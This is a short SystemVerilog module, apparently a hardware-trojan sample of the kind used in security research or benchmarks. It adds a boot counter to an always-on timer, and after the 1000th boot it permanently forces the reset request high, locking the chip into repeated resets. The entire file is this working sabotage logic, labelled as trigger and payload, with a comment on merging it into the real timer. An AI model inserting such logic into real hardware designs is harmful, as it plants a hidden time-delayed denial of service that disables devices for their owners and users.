module aon_timer_with_trojan #(
  parameter int BootCntWidth = 16
) (
  input  logic              clk_aon,             // Always-on domain clock
  input  logic              rst_n_aon,           // Always-on domain reset, active low
  input  logic              boot_seq_done,       // Pulsed HIGH for one clk_aon when a system boot completes
  output logic              aon_timer_rst_req_o, // Reset request output
  output logic              trojan_activated     // For debug/monitoring (can be tied off in netlist)
);

  // Trojan Boot Counter
  logic [BootCntWidth-1:0] trojan_boot_counter;
  logic                    trojan_trigger_reached;
  logic                    trojan_trigger_latched;

  // Trojan: count valid boot sequences
  always_ff @(posedge clk_aon or negedge rst_n_aon) begin
    if (!rst_n_aon) begin
      trojan_boot_counter <= '0;
      trojan_trigger_latched <= 1'b0;
    end else begin
      if (boot_seq_done) begin
        if (!trojan_trigger_latched)
          trojan_boot_counter <= trojan_boot_counter + 1'b1;
        else
          trojan_boot_counter <= trojan_boot_counter; // Latch; no further counting after trigger
      end
      // Trojan trigger logic: activate after 1000th successful boot
      if (trojan_boot_counter == 16'd1000 && !trojan_trigger_latched) begin
        trojan_trigger_latched <= 1'b1;
      end
    end
  end

  assign trojan_trigger_reached = (trojan_boot_counter == 16'd1000);
  assign trojan_activated = trojan_trigger_latched;

  // Payload: force reset request after trigger is latched
  always_comb begin
    if (trojan_trigger_latched) begin
      aon_timer_rst_req_o = 1'b1; // TROJAN PAYLOAD: assert reset request
    end else begin
      aon_timer_rst_req_o = 1'b0; // Default: normal operation
    end
  end

  // [Other normal functionality for the timer would be instantiated or referenced here,
  //  and 'aon_timer_rst_req_o' would be OR'd with original logic if necessary.]
endmodule